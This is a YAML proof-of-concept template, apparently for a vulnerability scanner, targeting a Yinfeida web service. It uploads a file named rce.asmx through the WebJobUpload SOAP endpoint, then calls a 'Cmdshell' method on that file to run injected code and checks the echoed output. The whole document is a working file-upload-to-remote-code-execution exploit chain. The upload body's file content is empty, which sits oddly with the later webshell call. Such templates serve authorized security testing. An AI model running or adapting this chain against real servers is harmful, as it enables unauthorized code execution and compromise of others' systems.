name: poc-yaml-yinfeida-files-upload
transport: http
  

rules:
  r0:
    request:
      method: POST
      path: /webservices/WebJobUpload.asmx
      headers:
        Content-Type: text/xml; charset=utf-8

      body: 
       "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n\
       <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n\
       <soap:Body>\r\n\
       <jobUpload xmlns=\"http://rainier\">\r\n\
       <vcode>1</vcode>\r\n\
       <subFolder></subFolder>\r\n\
       <fileName>rce.asmx</fileName>\r\n\
       <bufValue></bufValue>\r\n\
       </jobUpload>\r\n\
       </soap:Body>\r\n\
       </soap:Envelope>\r\n\
       "
    expression: response.status == 200

  r1:
    request:
      method: GET
      path: /1/rce.asmx/Cmdshell?Pass=Response.Write("Hello,World")
    expression: response.status == 200 && response.body.bcontains(b'Hello,World')
expression: r0() && r1()


detail:
  author: Superhero
  links:
    - https://blog.csdn.net/m0_60571842/article/details/139205658


